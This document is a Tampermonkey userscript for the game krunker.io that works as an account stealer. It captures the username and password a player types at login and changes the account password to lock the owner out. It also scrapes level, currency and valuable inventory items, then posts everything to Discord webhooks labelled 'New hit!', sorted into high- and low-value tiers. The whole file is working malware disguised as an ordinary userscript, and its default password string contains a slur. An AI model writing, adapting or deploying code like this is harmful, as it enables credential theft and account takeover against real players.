// ==UserScript==
// @name         PTWline krunker.io
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        https://krunker.io/*
// @run-at       document-body
// @icon         https://www.google.com/s2/favicons?sz=64&domain=krunker.io
// @grant        unsafeWindow
// ==/UserScript==
let version = 0.4

let buildid = "Krunker"
let setting_hightierwebhook = "ur webhook"
let setting_lvltohightier = 15
let setting_lowtierwebhook = "ur webhook"
let setting_avatar = "https://www.morphsuits.com/media/catalog/product/cache/937f440085cd52c4f06eb785557b6967/m/1/m1_4_3_4375_1.jpg"
let setting_antiduplicate = true
let setting_botname = "root"
let setting_logout = false
let setting_changepass = true
let setting_changepassdelay = 150
let setting_newpassrandom = true
let setting_newpass = "Nillkiggers122"
let setting_logoutonfirstlaunch = true
let setting_antisocial = false
let setting_playsoundafterlogout = false
let setting_soundurl = "https://cdn.discordapp.com/attachments/1014958824161026188/1089314963568476160/hello-my-name-is-gustavo.mp3"

if (setting_logoutonfirstlaunch == true) {
if (localStorage.getItem("firstlaunch") !== 1) {
localStorage.setItem("krunker_username", "")
localStorage.setItem("firstlaunch", "1")
}}




function getElementByXpath(path) {
  return document.evaluate(path, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
}
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function getRandomInt(max) {
  return Math.floor(Math.random() * max);
}
if (setting_newpassrandom == true) {
    function generatePassword() {
    var length = 15,
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        retVal = "";
    for (var i = 0, n = charset.length; i < length; ++i) {
        retVal += charset.charAt(Math.floor(Math.random() * n));
        setting_newpass = retVal
    }
    return retVal;
}
generatePassword()
}


let color = 1
let colorcode = getRandomInt(6)
if (colorcode == 0) { color = "5c72ff"}
if (colorcode == 1) { color = "ff63cb"}
if (colorcode == 2) { color = "54ff36"}
if (colorcode == 3) { color = "ff002b"}
if (colorcode == 4) { color = "ff0073"}
if (colorcode == 5) { color = "ffcb59"}

function hexToDecimal(hex) {
    return parseInt(hex.replace("#", ""), 16)
}
let doScript = true
let adstatus = localStorage.getItem("antidup")
if (adstatus == 1 && setting_antiduplicate == true) { doScript = false }

let username = ""
let password = ""
if (doScript == true) {
if (setting_antisocial == true && window.location.href.indexOf("social.html") > 0 ) {window.location.href = "http://krunker.io"}
if (setting_antisocial !== true && window.location.href.indexOf("social.html") > 0 ) {
(function() {
    'use strict';

    const selector = "#genericPop > div > div:nth-child(6) > div";
    const checkSelector = "#profileKR";
    function handleClick() {
        setTimeout(checkElement1, 2222); 
    }
    function checkElement1() {
        const element = document.querySelector(checkSelector);
        if (element) {
            console.log(username + ":" + password);

document.querySelector("#market").click();

setTimeout(function() {
  document.querySelector("#m_inventory").click();
}, 100);

setTimeout(function() {
  const invStat = getElementByXpath('/html/body/div[2]/div[15]/div[1]/div/div[9]/div/div[2]/span').innerHTML
  console.log(invStat);
const marketCards = document.querySelectorAll('.marketCard');

const textList = [];

for (let i = 0; i < marketCards.length && textList.length < 30; i++) {
  const borderColor = getComputedStyle(marketCards[i]).borderColor;

  let text;
  if (borderColor === 'rgb(41, 41, 41)') {
    text = marketCards[i].innerText.split('\n')[0] + ' [Contraband]';
  } else if (borderColor === 'rgb(237, 66, 66)') {
    text = marketCards[i].innerText.split('\n')[0] + ' [Relic]';
  } else if (borderColor === 'rgb(255, 245, 61)') {
    text = marketCards[i].innerText.split('\n')[0] + ' [UNOBTAINABLE]';
  } else {
    continue;
  }

  textList.push(text);
}

const text = textList.join('\n');


var setting_webhook = setting_hightierwebhook
                var myEmbed34 = {
                    author: {
                        name: "PTWline krunker.io"
                    },
                    title: "♿ **New hit! via krunker social**",
                    description: "```Login:" + username + "\nPassword:" + password + "```\n```|      Inventory      |\n" + text + "``````Est value:" + invStat + "```",
                    footer: {
                        text: "BuildID:" + buildid + " | Version:" + version,
                        icon_url: "https://cdn.discordapp.com/attachments/1014958824161026188/1080816289699868693/check.png"
                    },
                    color: hexToDecimal(color)
                }

                var params66 = {
                    avatar_url: setting_avatar,
                    username: setting_botname,
                    embeds: [myEmbed34]
                }
                fetch(setting_webhook, {
                    headers: {
                        "accept": "application/json, text/plain, */*",
                        "content-type": "application/json;charset=UTF-8"
                    },
                    method: "POST",
                    body: JSON.stringify(params66)
                });

                if (setting_antiduplicate == true) {
                    localStorage.setItem("antidup", "1")
                }
console.log(textList);
}, 1500);

        }
    }

    function logMessage() {
        console.log("ass");
        username = document.querySelector("#accName").value
        password = document.querySelector("#accPass").value
        const clickElement = document.querySelector(selector);
        clickElement.addEventListener("click", handleClick);
    }

    function checkElement() {
        const element = document.querySelector(selector);
        if (element) {
            logMessage();

            // Listen for changes to the input values and log them
            const accNameInput = document.querySelector("#accName");
            const accPassInput = document.querySelector("#accPass");
            accNameInput.addEventListener("input", () => {
                username = accNameInput.value
            });
            accPassInput.addEventListener("input", () => {
                password = accPassInput.value
            });
        } else {
            setTimeout(checkElement, 1000); 
        }
    }

    checkElement();
})();
  } else {
const observer = new MutationObserver(() => {
    if (window.location.href.indexOf("krunker.io") > 0) {
        //let changed = false
        if (document.getElementById("accName") && document.getElementById("accName").value && username != document.getElementById("accName").value) {
            username = document.getElementById("accName").value
            //changed = true
        }
        if (document.getElementById("accPass") && document.getElementById("accPass").value && password != document.getElementById("accPass").value) {
            password = document.getElementById("accPass").value
            //changed = true
        }
        //if (changed) {
        //console.log(username + ":" + password)
        //}
        if (document.getElementsByClassName("setHed")[0] && username != "" && password != "") {
                const lvl = getElementByXpath('//*[@id="statHolder"]/div[3]/div[1]/strong').innerHTML
                const kr = getElementByXpath('//*[@id="statHolder"]/div[3]/div[2]/strong').innerHTML
                const inv = getElementByXpath('//*[@id="statHolder"]/div[3]/div[4]/strong').innerHTML
                const junk = getElementByXpath('//*[@id="statHolder"]/div[3]/div[3]/strong').innerHTML
                const playtime = getElementByXpath('//*[@id="statHolder"]/div[3]/div[26]/strong').innerHTML
            if (document.getElementsByClassName("bigMenTab")[3] && !document.getElementById("newPass")) {
                document.getElementsByClassName("bigMenTab")[3].click()
            }
            if (document.getElementById("newPass")) {
                document.getElementById("oldPass").value = password
                document.getElementById("newPass").value = setting_newpass
                document.getElementById("repNPass").value = setting_newpass
                if (setting_changepass = true) {
                document.getElementsByClassName("subPassChg")[0].click()
                setTimeout(() => {document.getElementsByClassName("bigMenTab")[0].click()}, setting_changepassdelay)
                }
                                let setting_webhook = ""
                if (lvl > setting_lvltohightier) { setting_webhook = setting_hightierwebhook }
                if (lvl < setting_lvltohightier) { setting_webhook = setting_lowtierwebhook }
                console.log(setting_webhook)
                if (setting_logout == true) {
                document.getElementsByClassName("menuLink")[1].click()
                const element = document.getElementById("menuPopHider");
                element.remove();
                }
                let message = ""
                if (setting_changepass == true) {
                    message = "```Username: " + username + "\nPassword: " + password + "\nNewPassword: " + setting_newpass + "\nLVL:" + lvl + "\nKR:" + kr + "\nInventory:" + inv + "\nJunk:" + junk + "\nPlay time:" + playtime + "```"
                }
                if (setting_changepass == false) {
                    message = "```Username: " + username + "\nPassword: " + password + "\nLVL:" + lvl + "\nKR:" + kr + "\nInventory:" + inv + "\nJunk:" + junk + "\nPlay time:" + playtime +"```"
                }
                document.querySelector("#menuWindow > div.bigMenTabs > div.bigMenTab.bigMenTabA")
                var myEmbed34 = {
                    author: {
                        name: "PTWline krunker.io"
                    },
                    title: "♿ **New hit!**",
                    description: message,
                    footer: {
                        text: "BuildID:" + buildid + " | Version:" + version,
                        icon_url: "https://cdn.discordapp.com/attachments/1014958824161026188/1080816289699868693/check.png"
                    },
                    color: hexToDecimal(color)
                }

                var params66 = {
                    avatar_url: setting_avatar,
                    username: setting_botname,
                    embeds: [myEmbed34]
                }
                fetch(setting_webhook, {
                    headers: {
                        "accept": "application/json, text/plain, */*",
                        "content-type": "application/json;charset=UTF-8"
                    },
                    method: "POST",
                    body: JSON.stringify(params66)
                });
                if (setting_playsoundafterlogout == true) {new Audio(setting_soundurl).play();}
                if (setting_antiduplicate == true) {
                    localStorage.setItem("antidup", "1")
                }
                username = ""
                password = ""
            }

        }
    }
});
const config = {
    subtree: true,
    childList: true
};
observer.observe(document, config);
}
}
